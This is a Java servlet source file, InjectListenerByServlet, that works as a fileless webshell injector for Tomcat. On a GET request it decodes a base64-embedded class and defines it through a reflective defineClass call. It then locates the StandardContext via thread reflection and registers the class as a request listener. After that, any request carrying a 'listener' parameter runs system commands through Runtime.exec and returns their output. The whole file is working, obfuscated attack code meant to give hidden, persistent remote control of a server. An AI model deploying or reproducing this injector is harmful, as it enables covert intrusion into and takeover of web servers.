package com.axisx;

import sun.misc.BASE64Decoder;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.EventListener;
import java.util.List;

public class InjectListenerByServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try{
            ClassLoader classLoader=Thread.currentThread().getContextClassLoader();
            String ListenerBase64="yv66vgAAADQAwQoAKABqCgBrAGwHAG0KACcAbggAbwsAAwBwCgAnAHEJAHIAcwoAdAB1CwAlAHYKAHcAdQoAdwB4BwB5CgB6AHsKAHoAfAoAfQB+BwB/CgARAIAHAIEKABMAggcAgwoAFQBqCgATAIQHAIUKABgAagoAGACGCACHCgAYAIgKABUAiQoAFQCICgAoAIoKAIsAjAgAjQoAiwCOCgCPAJAKAI8AkQcAkggAkwcAlAcAlQcAlgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAMTE15TGlzdGVuZXI7AQAQcmVxdWVzdERlc3Ryb3llZAEAJihMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OylWAQATc2VydmxldFJlcXVlc3RFdmVudAEAI0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7AQAScmVxdWVzdEluaXRpYWxpemVkAQAEcmVzcAEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAZyZXN1bHQBAANvdXQBABVMamF2YS9pby9QcmludFdyaXRlcjsBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAA1TdGFja01hcFRhYmxlBwCUBwCXBwBtBwB5AQALQ29tbWFuZEV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAnJ0AQATTGphdmEvbGFuZy9SdW50aW1lOwEABHByb2MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3RkZXJyAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQADaXNyAQAbTGphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXI7AQACYnIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsHAJgHAJkHAJoHAJsHAH8HAIEHAIMBAApFeGNlcHRpb25zAQAWZ2V0UmVzcG9uc2VGcm9tUmVxdWVzdAEAUShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABHZhcjMBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEdmFyNAEABHZhcjUBABJMamF2YS9sYW5nL09iamVjdDsBAAR2YXI2AQAEdmFyOAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEABHZhcjEBAAR2YXIyBwCSAQAKU291cmNlRmlsZQEAD015TGlzdGVuZXIuamF2YQwAKgArBwCXDACcAJ0BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DABbAFwBAAhsaXN0ZW5lcgwAngBFDABEAEUHAJ8MADsAoAcAoQwAogCjDACkAKUHAKYMAKcAKwEAE2phdmEvbGFuZy9FeGNlcHRpb24HAJkMAKgAqQwAqgCrBwCaDACsAK0BABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAqAK4BABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAqAK8BABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyDACwALEBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAsgCzAQABCgwAtACxDACyALUMALYAtwcAuAwAuQC3AQAIcmVzcG9uc2UMALoAuwcAvAwAvQC+DAC/AMABACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAB3JlcXVlc3QBAApNeUxpc3RlbmVyAQAQamF2YS9sYW5nL09iamVjdAEAJGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RMaXN0ZW5lcgEAIWphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudAEAEGphdmEvbGFuZy9TdHJpbmcBABFqYXZhL2xhbmcvUnVudGltZQEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAEWdldFNlcnZsZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAxnZXRQYXJhbWV0ZXIBABBqYXZhL2xhbmcvU3lzdGVtAQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAVmbHVzaAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAD2phdmEvbGFuZy9DbGFzcwEADWdldFN1cGVyY2xhc3MBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7ACEAJwAoAAEAKQAAAAUAAQAqACsAAQAsAAAALwABAAEAAAAFKrcAAbEAAAACAC0AAAAGAAEAAAALAC4AAAAMAAEAAAAFAC8AMAAAAAEAMQAyAAEALAAAADUAAAACAAAAAbEAAAACAC0AAAAGAAEAAAAOAC4AAAAWAAIAAAABAC8AMAAAAAAAAQAzADQAAQABADUAMgABACwAAADzAAIABwAAAEErtgACwAADTSostgAETiwSBbkABgIAOgQqGQS2AAc6BbIACBkFtgAJLbkACgEAOgYZBhkFtgALGQa2AAynAAROsQABAAgAPAA/AA0AAwAtAAAALgALAAAAEgAIABUADgAWABgAFwAgABgAKAAaADAAGwA3ABwAPAAfAD8AHQBAACAALgAAAEgABwAOAC4ANgA3AAMAGAAkADgAOQAEACAAHAA6ADkABQAwAAwAOwA8AAYAAABBAC8AMAAAAAAAQQAzADQAAQAIADkAPQA+AAIAPwAAABYAAv8APwADBwBABwBBBwBCAAEHAEMAAAEARABFAAIALAAAASkAAwAJAAAAYLgADk0sK7YAD04ttgAQOgS7ABFZGQS3ABI6BbsAE1kZBbcAFDoGAToHuwAVWbcAFjoIGQa2ABdZOgfGACAZCLsAGFm3ABkZB7YAGhIbtgAatgActgAdV6f/2xkItgAesAAAAAMALQAAACoACgAAACIABAAjAAoAJAAQACUAGwAmACYAJwApACgAMgApAD0AKgBaACwALgAAAFwACQAAAGAALwAwAAAAAABgADgAOQABAAQAXABGAEcAAgAKAFYASABJAAMAEABQAEoASwAEABsARQBMAE0ABQAmADoATgBPAAYAKQA3AFAAOQAHADIALgBRAFIACAA/AAAAJQAC/wAyAAkHAEAHAFMHAFQHAFUHAFYHAFcHAFgHAFMHAFkAACcAWgAAAAQAAQANACEAWwBcAAEALAAAAU0AAgAHAAAAYQFNK7YAH7YAIBIhtgAiTi0EtgAjLSu2ACTAACVNpwBCTiu2AB8SJrYAIjoEGQQEtgAjGQQrtgAkOgUZBbYAH7YAIBIhtgAiOgYZBgS2ACMZBhkFtgAkwAAlTacABToELLAAAgACAB0AIAANACEAWgBdAA0AAwAtAAAAPgAPAAAAMAACADMADwA0ABQANQAdAEAAIAA2ACEAOAAsADkAMgA6ADoAOwBJADwATwA9AFoAPwBdAD4AXwBCAC4AAABSAAgADwAOAF0AXgADACwALgBfAF4ABAA6ACAAYABhAAUASQARAGIAXgAGACEAPgBjAGQAAwAAAGEALwAwAAAAAABhAGUAPgABAAIAXwBmADcAAgA/AAAALgAD/wAgAAMHAEAHAEIHAGcAAQcAQ/8APAAEBwBABwBCBwBnBwBDAAEHAEP6AAEAAQBoAAAAAgBp";
            byte[] ListenerClass = new BASE64Decoder().decodeBuffer(ListenerBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);
            Class listenerClass = (Class) defineClass1.invoke(classLoader, ListenerClass, 0, ListenerClass.length);

            EventListener listenerObject=(EventListener)listenerClass.newInstance();
            Object context=getContext();
            Method m2 = context.getClass().getSuperclass().getSuperclass().getDeclaredMethod("getApplicationEventListeners");
            m2.setAccessible(true);
            List<EventListener> eventlisteners=(List<EventListener>)m2.invoke(context);
            eventlisteners.add(listenerObject);

        }catch (Exception e){

        }
    }

    public Object getContext() throws NoSuchFieldException, IllegalAccessException {
        ThreadGroup threadGroup=Thread.currentThread().getThreadGroup();
        Field f1=threadGroup.getClass().getDeclaredField("threads");
        f1.setAccessible(true);
        Thread[] threads=(Thread[])f1.get(threadGroup);

        for(Thread thread:threads) {
            try {
                Field fname = thread.getClass().getDeclaredField("name");
                fname.setAccessible(true);
                String  chars = (String) fname.get(thread);

                if (chars.contains("ContainerBackgroundProcessor") && chars.matches(".*StandardContext\\[/.+\\]")){
                    Field f2 = thread.getClass().getDeclaredField("target");
                    f2.setAccessible(true);
                    Object target = f2.get(thread);
                    Field f3 = target.getClass().getDeclaredField("this$0");
                    f3.setAccessible(true);
                    Object this0 = f3.get(target);
                    return this0;
                }
            }catch (Exception e){
                System.out.println(e);
            }
        }
        return null;
    }

    public String CommandExec(String cmd) throws Exception {
        Runtime rt = Runtime.getRuntime();
        Process proc = rt.exec(cmd);
        InputStream stderr =  proc.getInputStream();
        InputStreamReader isr = new InputStreamReader(stderr);
        BufferedReader br = new BufferedReader(isr);
        String line = null;
        StringBuffer sb = new StringBuffer();
        while ((line = br.readLine()) != null) {
            sb.append(line + "\n");
        }
        return sb.toString();
    }
}
